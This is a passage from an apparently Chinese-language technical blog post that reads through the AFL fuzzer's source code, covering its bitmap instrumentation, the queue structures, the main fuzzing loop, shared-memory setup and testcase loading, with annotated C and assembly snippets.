class="line"><span class="string">&quot;  movq 224(%rsp), %xmm8\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 240(%rsp), %xmm9\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 256(%rsp), %xmm10\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 272(%rsp), %xmm11\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 288(%rsp), %xmm12\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 304(%rsp), %xmm13\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 320(%rsp), %xmm14\n&quot;</span></span><br><span class="line"><span class="string">&quot;  movq 336(%rsp), %xmm15\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  leaq 352(%rsp), %rsp\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  jmp  __afl_store\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;__afl_die:\n&quot;</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="string">&quot;  xorq %rax, %rax\n&quot;</span></span><br><span class="line">CALL_L64(<span class="string">&quot;_exit&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="afl-store"><code>__afl_store</code></h3><p><code>__afl_store</code> 用来更新bitmap状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="string">&quot;__afl_store:\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  /* Calculate and store hit for the code location specified in rcx. */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> COVERAGE_ONLY</span></span><br><span class="line">  <span class="string">&quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^!COVERAGE_ONLY */</span></span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SKIP_COUNTS</span></span><br><span class="line">  <span class="string">&quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;  incb (%rdx, %rcx, 1)\n&quot;</span></span><br></pre></td></tr></table></figure><p>此处笔者其实还没有完全理解，这里的rcx实际上是trampoline中送来的标识每一个基本块的随机id，此处的代码用随机id异或上一个运行的桩的随机id来作为当前块在bitmap里的offset，并将此offset处的计数加一，用来表示对应的基本块运行了一次，同时，将此id存入 <code>__afl_prev_loc</code> 使用，记录为上一次桩的随机id，并右移一位。</p><p>这里offset是怎么保证不重复的呢，笔者感觉应该是跟线性同余随机算法的特性有关，不过由于不是笔者的重点，所以笔者暂且不过多探究。</p><h1 id="afl-fuzz-一次fuzz的标准流程">afl-fuzz | 一次fuzz的标准流程</h1><h2 id="全局变量">全局变量</h2><p>首先是bitmap相关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST u8 *trace_bits; <span class="comment">// 和子进程共享的bitmap，程序运行的结果就存在于此bitmap中</span></span><br><span class="line"></span><br><span class="line">EXP_ST u8 virgin_bits[MAP_SIZE], <span class="comment">// 标记仍然没有被触及到的区域</span></span><br><span class="line">    virgin_tmout[MAP_SIZE],      <span class="comment">// 标记还没有出现在tmout的区域</span></span><br><span class="line">    virgin_crash[MAP_SIZE];      <span class="comment">// 标记还没有出现在crash的区域</span></span><br></pre></td></tr></table></figure><p>然后是testcase组成的队列，每一个testcase会在初始化时被初始化为queue中的一个实体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">  u8 *fname; <span class="comment">/* File name for the test case      */</span></span><br><span class="line">  u32 len;   <span class="comment">/* Input length                     */</span></span><br><span class="line"></span><br><span class="line">  u8 cal_failed,    <span class="comment">/* Calibration failed?              */</span></span><br><span class="line">      trim_done,    <span class="comment">/* Trimmed?                         */</span></span><br><span class="line">      was_fuzzed,   <span class="comment">/* Had any fuzzing done yet?        */</span></span><br><span class="line">      passed_det,   <span class="comment">/* Deterministic stages passed?     */</span></span><br><span class="line">      has_new_cov,  <span class="comment">/* Triggers new coverage?           */</span></span><br><span class="line">      var_behavior, <span class="comment">/* Variable behavior?               */</span></span><br><span class="line">      favored,      <span class="comment">/* Currently favored?               */</span></span><br><span class="line">      fs_redundant; <span class="comment">/* Marked as redundant in the fs?   */</span></span><br><span class="line"></span><br><span class="line">  u32 bitmap_size, <span class="comment">/* Number of bits set in bitmap     */</span></span><br><span class="line">      exec_cksum;  <span class="comment">/* Checksum of the execution trace  */</span></span><br><span class="line"></span><br><span class="line">  u64 exec_us,  <span class="comment">/* Execution time (us)              */</span></span><br><span class="line">      handicap, <span class="comment">/* Number of queue cycles behind    */</span></span><br><span class="line">      depth;    <span class="comment">/* Path depth                       */</span></span><br><span class="line"></span><br><span class="line">  u8 *trace_mini; <span class="comment">/* Trace bytes, if kept             */</span></span><br><span class="line">  u32 tc_ref;     <span class="comment">/* Trace bytes ref count            */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">next</span>, /* <span class="title">Next</span> <span class="title">element</span>, <span class="title">if</span> <span class="title">any</span>             */</span></span><br><span class="line"><span class="class">      *<span class="title">next_100</span>;</span>            <span class="comment">/* 100 elements ahead               */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">queue</span>, /* <span class="title">Fuzzing</span> <span class="title">queue</span> (<span class="title">linked</span> <span class="title">list</span>)      */</span></span><br><span class="line"><span class="class">    *<span class="title">queue_cur</span>,                   // 当前处理的<span class="title">testscase</span></span></span><br><span class="line"><span class="class">    *<span class="title">queue_top</span>,                   // <span class="title">testcase</span> <span class="title">list</span>的顶部</span></span><br><span class="line"><span class="class">    *<span class="title">q_prev100</span>;</span>                   <span class="comment">// 前100标记</span></span><br></pre></td></tr></table></figure><p>然后是与queue相关的一些变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST u32 queued_paths,  <span class="comment">// </span></span><br><span class="line">    queued_variable,     <span class="comment">// 存在可变区域的testcase的数量</span></span><br><span class="line">    queued_at_start,     <span class="comment">// testcase 的初始数量</span></span><br><span class="line">    queued_discovered,   <span class="comment">// 运行时发现的数量</span></span><br><span class="line">    queued_imported,     <span class="comment">// 通过-S引入的数量</span></span><br><span class="line">    queued_favored,      <span class="comment">// favored_queue 的数量</span></span><br><span class="line">    queued_with_cov,     <span class="comment">// 存在新覆盖的queue的数量</span></span><br><span class="line">    pending_not_fuzzed,  <span class="comment">// 还没有被fuzz的数量</span></span><br><span class="line">    pending_favored,     <span class="comment">// 还没有被fuzz的favored_queue的数量</span></span><br><span class="line">    cur_skipped_paths,   <span class="comment">/* Abandoned inputs in cur cycle    */</span></span><br><span class="line">    cur_depth,           <span class="comment">/* Current path depth               */</span></span><br><span class="line">    max_depth,           <span class="comment">/* Max path depth                   */</span></span><br><span class="line">    useless_at_start,    <span class="comment">/* Number of useless starting paths */</span></span><br><span class="line">    var_byte_count,      <span class="comment">/* Bitmap bytes with var behavior   */</span></span><br><span class="line">    current_entry,       <span class="comment">/* Current queue entry ID           */</span></span><br><span class="line">    havoc_div = <span class="number">1</span>;       <span class="comment">/* Cycle count divisor for havoc    */</span></span><br></pre></td></tr></table></figure><h2 id="main">main</h2><p>fuzz的开始是对于参数的解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_dir) FATAL(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">  in_dir = optarg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure><p>在完成参数的解析后， 开始设置对应的信号处理的handle, 这一部分将在之后进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_signal_handlers();</span><br></pre></td></tr></table></figure><p>以及检查ASAN参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check_asan_opts();</span><br></pre></td></tr></table></figure><p>然后开始对应环境变量的解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sync_id) fix_up_sync();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">  FATAL(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) FATAL(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)  FATAL(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">  hang_tmout = atoi(getenv(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (!hang_tmout) FATAL(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">  FATAL(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">  setenv(<span class="string">&quot;LD_PRELOAD&quot;</span>, getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  setenv(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, getenv(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">  FATAL(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br></pre></td></tr></table></figure><p>对于此处涉及到的环境变量将在后面一一说明</p><p>接下来将原来的命令行参数保存起来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save_cmdline(argc, argv);</span><br></pre></td></tr></table></figure><p>设置用户态banner</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fix_up_banner(argv[optind]);</span><br></pre></td></tr></table></figure><p>检查是否在tty模式下运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check_if_tty();</span><br></pre></td></tr></table></figure><p>获取核心数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_core_count();</span><br></pre></td></tr></table></figure><p>如果设置了 AFFINITY</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  bind_to_free_cpu();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br></pre></td></tr></table></figure><p>然后是一些对于机器和架构的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_crash_handling();</span><br><span class="line">check_cpu_governor();</span><br></pre></td></tr></table></figure><p>设置postprocessor</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_post();</span><br></pre></td></tr></table></figure><p>设置共享内存用于消息的传递</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_shm();</span><br></pre></td></tr></table></figure><p>对于class16数据进行分类</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_count_class16();</span><br></pre></td></tr></table></figure><p>为输出文件设置dir以及fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_dirs_fds();</span><br></pre></td></tr></table></figure><p>读取初始测试用例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_testcases();</span><br><span class="line">load_auto();</span><br></pre></td></tr></table></figure><p>对输入目录进行一些处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pivot_inputs();</span><br></pre></td></tr></table></figure><p>接下来又是一连串的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (extras_dir) load_extras(extras_dir);</span><br><span class="line"><span class="comment">// 如果设置了extras，那么加载extras</span></span><br><span class="line"><span class="comment">// 类似于字典</span></span><br><span class="line"><span class="keyword">if</span> (!timeout_given) find_timeout();</span><br><span class="line"><span class="comment">// 如果设置了timeout，设置给定timeout</span></span><br><span class="line">detect_file_args(argv + optind + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 检查运行参数，找到@@</span></span><br><span class="line"><span class="keyword">if</span> (!out_file) setup_stdio_file();</span><br><span class="line"><span class="comment">// 设置输出文件</span></span><br><span class="line">check_binary(argv[optind]);</span><br><span class="line"><span class="comment">// 检查目标程序</span></span><br><span class="line">start_time = get_cur_time();</span><br><span class="line"><span class="comment">// 设置起始时间</span></span><br><span class="line"><span class="keyword">if</span> (qemu_mode)</span><br><span class="line"><span class="comment">// 如果使用了qemu_mode</span></span><br><span class="line">  use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  use_argv = argv + optind;</span><br></pre></td></tr></table></figure><p>对于输入进行试运行，确保所有输入符合预期</p><p>接下来cull_queue，在之后继续分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cull_queue();</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show_init_stats();</span><br><span class="line"><span class="comment">// 输出初始状态</span></span><br><span class="line">seek_to = find_start_position();</span><br><span class="line"><span class="comment">// 针对resume状态而言，快速回复到终止位置</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 将初始状态保存在stat文件中</span></span><br><span class="line">save_auto();</span><br><span class="line"><span class="comment">// 保存自动生成的extras </span></span><br></pre></td></tr></table></figure><p>接下来是针对stop的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">  sleep(<span class="number">4</span>);</span><br><span class="line">  start_time += <span class="number">4000</span>;</span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后正式进入fuzz循环</p><p>在循环前还要cull_queue 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">   u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">   cull_queue();</span><br><span class="line"><span class="comment">// 再次进行cull_queue 操作</span></span><br><span class="line">   <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line">   </span><br><span class="line">     queue_cycle++;</span><br><span class="line">     current_entry     = <span class="number">0</span>;</span><br><span class="line">     cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">     queue_cur         = <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">       current_entry++;</span><br><span class="line">       seek_to--;</span><br><span class="line">       queue_cur = queue_cur-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">  <span class="comment">// 当存在seek_to时，直接跳到对应的testcase</span></span><br><span class="line">     show_stats();</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">       ACTF(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">       fflush(<span class="built_in">stdout</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">        recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">       sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   skipped_fuzz = fuzz_one(use_argv);</span><br><span class="line"><span class="comment">// 运行一次fuzz，并完成种子的变异阶段</span></span><br><span class="line">   <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">       sync_fuzzers(use_argv);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   queue_cur = queue_cur-&gt;next;</span><br><span class="line">   current_entry++;</span><br><span class="line">   <span class="comment">// 测试下一个种子</span></span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="setup-shm-基于共享内存的消息传递">setup_shm | 基于共享内存的消息传递</h2><p>这里是和fuzz对象子进程对应的设置共享内存，用来传递bitmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">setup_shm</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="type">void</span> *)<span class="number">-1</span>) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接创建一个共享内存，同子进程forkserver中 <code>__afl_global_area</code> 指向的区域进行共享</p><h2 id="对于testcase的预处理">对于testcase的预处理</h2><p>主要包含三个函数：</p><ul><li>read_testcase: 从文件中读取testcases</li><li>perform_dry_run: 对于testcase的试运行</li><li>cull_queue: 挑选更好的种子</li></ul><h3 id="read-testcases-读取testcase">read_testcases | 读取testcase</h3><p>用来从文件中读取testcase</p><p>首先创建了一些局部变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> **<span class="title">nl</span>;</span></span><br><span class="line">s32 nl_cnt;</span><br><span class="line">u32 i;</span><br><span class="line">u8* fn;</span><br></pre></td></tr></table></figure><p>找到queue文件夹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, 